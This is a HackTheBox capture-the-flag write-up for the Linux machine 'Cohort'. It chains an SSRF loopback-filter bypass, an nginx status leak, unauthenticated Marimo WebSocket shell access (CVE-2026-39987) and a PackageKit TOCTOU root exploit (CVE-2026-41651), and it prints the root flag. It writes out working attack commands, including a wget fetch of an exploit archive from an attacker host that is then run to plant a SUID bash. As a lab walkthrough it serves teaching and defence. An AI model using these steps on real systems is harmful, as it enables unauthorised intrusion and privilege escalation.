---
type: writeup
platform: HTB
name: Cohort
os: Linux
difficulty: Medium
status: completed
tags: [htb, linux, medium, ssrf, ssrf-bypass, internal-recon, marimo, cve-2026-39987, pre-auth-rce, websocket, packagekit, cve-2026-41651, toctou, privesc]
techniques:
  - SSRF with loopback filter bypass
  - Internal port enumeration via SSRF
  - Nginx status endpoint leaking vhost config
  - Pre-authentication RCE via unauthenticated WebSocket endpoint (CVE-2026-39987)
  - PackageKit TOCTOU privilege escalation (CVE-2026-41651)
tools:
  - nmap
  - ffuf
  - curl
  - wscat
  - wget
  - python3 (http.server)
  - git (CVE-2026-41651 PoC)
date: 2026-09-28
---

# Cohort — HackTheBox Writeup

![](images/Pasted%20image%2020260926160100.png)

---

## Summary

Cohort is a medium-difficulty Linux machine centred around a data-reconciliation web application. The attack chain starts with a Server-Side Request Forgery (SSRF) vulnerability in the report-source registration feature. The SSRF filter only blocklists literal `127.0.0.1` and `localhost`, allowing a bypass via the alternate loopback notation `127.1`. This lets us enumerate internal ports, where we find a **Marimo** notebook server (a reactive Python notebook tool) running on port 8888. Querying the internal nginx `/status` endpoint via the same SSRF reveals the Marimo instance's full vhost hostname. We connect to it directly and exploit **CVE-2026-39987** — an unauthenticated WebSocket endpoint (`/terminal/ws`) in Marimo that skips the authentication check entirely and drops us into an interactive shell. From there, PackageKit 1.2.8-2ubuntu1.2 is installed, which is vulnerable to **CVE-2026-41651**, a TOCTOU race in `pk-transaction.c` that lets any local user install a root-owned SUID binary without polkit authorization.

**Attack Chain:**
1. Discover SSRF in `/api/validate` report source URL registration
2. Bypass the loopback filter using `127.1` — confirm SSRF with the app's own HTML response
3. Enumerate internal ports via SSRF → find port 5000 (internal JSON API) and port 8888 (Marimo notebook)
4. Hit internal nginx `/status` via SSRF → leak the Marimo vhost: `nb-1be3782a8afd3ad5.cohort.htb`
5. Connect directly to the vhost's `/terminal/ws` WebSocket endpoint → pre-auth RCE as `marimo` (CVE-2026-39987)
6. Confirm PackageKit 1.2.8-2ubuntu1.2 → exploit CVE-2026-41651 TOCTOU → root SUID bash → root

**Flags:**
- User: `/home/marimo/user.txt`
- Root: `/root/root.txt` → `62f359e7123a0c907e793299510114a7`

---

## Enumeration

### Nmap Scan

![](images/Pasted%20image%2020260926160746.png)

```bash
sudo nmap -sCV -p- cohort.htb
```

Standard scan reveals the open ports. The machine runs a web service on port 80 and SSH on 22, redirecting to `cohort.htb`.

```bash
echo "<target-ip> cohort.htb" | sudo tee -a /etc/hosts
```

### Web Enumeration

![](images/Pasted%20image%2020260926160819.png)

Visiting `http://cohort.htb` loads a data analytics / financial reconciliation platform. The UI presents two key features:

- **Register a report source** — accepts a URL pointing to a CSV/data file, fetches a preview server-side.
- **Reconciliation jobs** — scheduled jobs that pull registered sources and process them into notebooks.

The "Register a report source" feature is the attack surface: it performs a server-side HTTP fetch of a user-supplied URL, which is a classic SSRF scenario.

### Vhost Fuzzing

![](images/Pasted%20image%2020260926161336.png)

```bash
ffuf -u http://cohort.htb/ \
  -H "Host: FUZZ.cohort.htb" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
  -ac
```

![](images/Pasted%20image%2020260926161849.png)

Fuzzing reveals additional vhosts. Add any discovered subdomains to `/etc/hosts`.

---

## Foothold

### Stage 1 — SSRF Discovery

![](images/Pasted%20image%2020260926163712.png)

The report source registration endpoint (`/api/validate`) accepts a JSON body:

```json
{"url": "http://<attacker-ip>/test.csv", "format": "CSV"}
```

Sending this while running a listener on the attacker machine confirms the server makes an outbound HTTP GET to the supplied URL — this is a server-side request forgery primitive.

![](images/Pasted%20image%2020260926163734.png)

**Attempting to reach localhost directly:**

```json
{"url": "http://127.0.0.1/", "format": "CSV"}
```

The server returns an error indicating internal/loopback addresses are rejected. The filter is checking for the literal string `127.0.0.1` and `localhost`.

![](images/Pasted%20image%2020260926163853.png)

### Stage 2 — SSRF Filter Bypass via Alternate Loopback Notation

![](images/Pasted%20image%2020260926164021.png)

IPv4 addresses can be expressed in several equivalent forms that all resolve to `127.0.0.1` but won't match a naive string blocklist:

| Representation | Resolves to |
|---|---|
| `127.0.0.1` | loopback (blocked) |
| `localhost` | loopback (blocked) |
| `127.1` | loopback ✅ |
| `0x7f000001` | loopback |
| `2130706433` (decimal) | loopback |

Using `127.1` (a valid shortened IPv4 notation the OS kernel expands to `127.0.0.1`):

```json
{"url": "http://127.1/", "format": "CSV"}
```

![](images/Pasted%20image%2020260926165311.png)

**The server returns its own HTML page** — SSRF filter bypassed. The server fetched its own localhost port 80 and returned the response. Internal SSRF is confirmed.

### Stage 3 — Internal Port Enumeration

![](images/Pasted%20image%2020260926165420.png)

![](images/Pasted%20image%2020260926165446.png)

With the SSRF primitive working, enumerate which ports are listening only on localhost by iterating through common service ports:

```json
{"url": "http://127.1:8888/", "format": "CSV"}
{"url": "http://127.1:5000/", "format": "CSV"}
```

**Findings:**

| Port | Response | Service |
|------|----------|---------|
| 8888 | Returns HTML login page, title "mario", action `/auth/login` | Custom web app (Marimo notebook) |
| 5000 | `405 Method Not Allowed` — `{"ok": false, "message": "Method not allowed."}` | Internal JSON API (GET not allowed on `/`) |

Port 8888 is a **Marimo** notebook server — a reactive Python notebook tool (similar to Jupyter). The presence of `/auth/login` suggests it has authentication enabled.

> **Key insight:** At this point, directly attacking the Marimo login page via the SSRF is limited — the SSRF proxy performs a single plain HTTP GET and can't complete a WebSocket handshake or maintain session state. We need to find the Marimo instance's hostname so we can connect to it directly.

### Stage 4 — Nginx Status Endpoint Leaks Internal Vhost Config

![](images/Pasted%20image%2020260926232926.png)

Many nginx deployments expose a `/status` or `/nginx_status` endpoint for health checks. Hitting it via the SSRF:

```json
{"url": "http://127.1/status", "format": "CSV"}
```

The endpoint returns nginx's internal upstream/proxy configuration as JSON, including the vhost-to-upstream mapping:

```
nb-1be3782a8afd3ad5.cohort.htb → proxies to 127.0.0.1:8888
```

This is the critical pivot. Unlike the SSRF (which is a one-shot blind GET proxy), this vhost is a **real nginx reverse proxy** — reachable directly from our attacking machine — and it forwards WebSocket traffic too, which the SSRF cannot do.

Add the vhost to `/etc/hosts`:

```bash
echo "<target-ip> nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
```

### Stage 5 — Pre-Authentication RCE via CVE-2026-39987 (Marimo `/terminal/ws`)

![](images/Pasted%20image%2020260927213650.png)

![](images/Pasted%20image%2020260927213853.png)

**CVE-2026-39987** is a pre-authentication Remote Code Execution vulnerability in Marimo ≤ 0.20.4 (fixed in 0.23.0).

**Root cause:** Marimo exposes two WebSocket endpoints:

| Endpoint | Auth check |
|----------|-----------|
| `/ws` | ✅ Calls `validate_auth()` |
| `/terminal/ws` | ❌ No auth check — **completely unauthenticated** |

`/terminal/ws` spawns a **PTY-backed system shell** for Marimo's built-in terminal UI feature. Because `validate_auth()` is never called on this endpoint, any client that completes a WebSocket handshake gets a live, interactive OS shell — regardless of whether a password is set on the Marimo instance.

**Verification — check the Marimo version before attempting exploitation:**

![](images/Pasted%20image%2020260928153533.png)

![](images/Screenshot%202026-09-28%20143543.png)

**Exploitation:**

Install `wscat` — a CLI WebSocket client (equivalent to `curl` for WebSocket connections):

```bash
npm install -g wscat
```

Connect to the unauthenticated terminal endpoint:

```bash
npx wscat -n \
  -c wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws \
  -H "Origin: https://nb-1be3782a8afd3ad5.cohort.htb"
```

**Flag breakdown:**
- `-n` — skip TLS certificate verification (the machine uses a self-signed certificate)
- `-c <url>` — WebSocket URL using `wss://` (WebSocket-over-TLS) instead of `https://`
- `-H "Origin: ..."` — some servers perform an `Origin` header check as a lightweight CSRF guard on WebSocket upgrades; setting it to the server's own hostname passes that check

![](images/Pasted%20image%2020260928153634.png)

![](images/Pasted%20image%2020260928153953.png)

Once connected, the session behaves as an interactive terminal. All input is executed as shell commands on the server, running as the `marimo` user (the account the Marimo notebook process runs under).

```bash
id
# uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)

cat /home/marimo/user.txt
```

**User flag obtained.**

---

## Privilege Escalation — CVE-2026-41651 (PackageKit TOCTOU, "Pack2TheRoot")

### Identifying the Vulnerable Package

![](images/Pasted%20image%2020260928154236.png)

From the Marimo WebSocket shell, check the installed PackageKit version:

```bash
dpkg -l | grep -i packagekit
```

Output confirms **PackageKit 1.2.8-2ubuntu1.2** — within the vulnerable range of CVE-2026-41651 (1.0.2 through 1.3.4).

### Understanding CVE-2026-41651

![](images/Pasted%20image%2020260928154331.png)

CVE-2026-41651 is a **Time-of-Check Time-of-Use (TOCTOU) race condition** in PackageKit's `pk-transaction.c`. Three bugs chain together:

| Bug | Description |
|-----|-------------|
| **Unconditional flag overwrite** | `InstallFiles()` overwrites `cached_transaction_flags` and `cached_full_paths` with no state check |
| **Silent state-transition rejection** | Backward state transitions are silently dropped, but the flags were already overwritten before the rejection |
| **Late flag read** | The transaction dispatcher reads flags at async execution time (via GLib idle callback), not at authorization time |
| **Bonus: SIMULATE skips polkit** | Setting the `SIMULATE` flag bypasses polkit authorization entirely |

**Exploit flow (no timing required):**

1. Send `InstallFiles(SIMULATE, dummy_package)` — polkit is bypassed, state transitions to `READY`, flags are set
2. Immediately send `InstallFiles(NONE, malicious_package)` — overwrites the flags with a real (non-simulate) install before the GLib idle callback fires
3. The daemon executes the second install as root with no authentication — the race window is effectively zero since both D-Bus calls land before the idle handler

### Exploitation Steps

**Step 1 — Get the public PoC**

On the attacker machine:

```bash
git clone https://github.com/Vozec/CVE-2026-41651.git
cd CVE-2026-41651
```

![](images/Pasted%20image%2020260928154554.png)

**Step 2 — Transfer the exploit to the target**

Package and serve it from an isolated directory (avoids exposing home directory contents via an over-broad recursive HTTP server):

```bash
cd ~
tar czf exploit.tar.gz CVE-2026-41651/
mkdir -p /tmp/serve_exploit
cp exploit.tar.gz /tmp/serve_exploit/
cd /tmp/serve_exploit
python3 -m http.server 8081
```

On the target (via the wscat shell), download and extract:

```bash
cd /tmp && wget http://10.10.16.244:8081/exploit.tar.gz && tar xzf exploit.tar.gz && ls -la CVE-2026-41651
```

![](images/Pasted%20image%2020260928154605.png)

The repository ships a **pre-built binary** (`cve-2026-41651`), so no compilation step is needed on the target.

**Step 3 — Run the exploit**

```bash
cd /tmp/CVE-2026-41651 && ./cve-2026-41651
```

![](images/Pasted%20image%2020260928154732.png)

The binary:
1. Builds two `.deb` packages locally — a dummy (for the SIMULATE call) and a payload (for the real install)
2. Fires the `SIMULATE` + real `InstallFiles` D-Bus calls in rapid succession
3. Polls for the result

Within a couple of seconds:

```
[*] t+1s: payload=exists dpkg_lock=free suid=FOUND
[+] SUCCESS — SUID bash at t+0ms
```

The payload's `postinst` script set the SUID bit on a dropped bash binary at `/tmp/.suid_bash`.

**Step 4 — Confirm the SUID binary and get root**

```bash
find /tmp -maxdepth 2 -iname "*suid*" -exec ls -la {} \;
# -rwsr-xr-x 1 root root 1446024 /tmp/.suid_bash
```

```bash
/tmp/.suid_bash -p -c "id; cat /root/root.txt"
```

(`-p` preserves the effective UID instead of dropping privileges on bash start.)

![](images/Pasted%20image%2020260928160221.png)

**Result:**

```
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
62f359e7123a0c907e793299510114a7
```

Root obtained.

---

## Key Takeaways

| Lesson | Detail |
|--------|--------|
| **SSRF filter bypasses** | Blocklisting `127.0.0.1` and `localhost` is insufficient. `127.1`, `0x7f000001`, `2130706433`, and DNS-rebinding all bypass string-based filters. Always validate by resolving the IP and checking against reserved ranges. |
| **Internal metadata endpoints** | Nginx `/status`, cloud metadata services (`169.254.169.254`), and similar endpoints leak architecture details that are invaluable for pivoting. Always probe these via SSRF. |
| **Inconsistent auth across endpoints** | CVE-2026-39987 shows that adding authentication to one endpoint doesn't protect others. Every WebSocket, API, and admin endpoint must independently enforce auth. |
| **SSRF → vhost → direct access** | A blind GET-only SSRF can't do WebSocket upgrades. The pattern here is: SSRF to enumerate, leak the real vhost, then connect directly and use the full protocol. |
| **TOCTOU without a race window** | CVE-2026-41651 is called a TOCTOU race but requires no timing luck — the two D-Bus calls land before the idle handler fires, making it deterministic. Look for async dispatch patterns when auditing privilege management. |
| **PackageKit as privesc surface** | PackageKit runs as root and is installed by default on many Ubuntu/Fedora systems. Always check its version during local enumeration. |

---

## Tools Used

- nmap
- ffuf
- curl
- wscat (npm)
- python3 (http.server)
- wget
- git / CVE-2026-41651 PoC binary

---

## Flags

- **User:** `cat /home/marimo/user.txt`
- **Root:** `62f359e7123a0c907e793299510114a7`
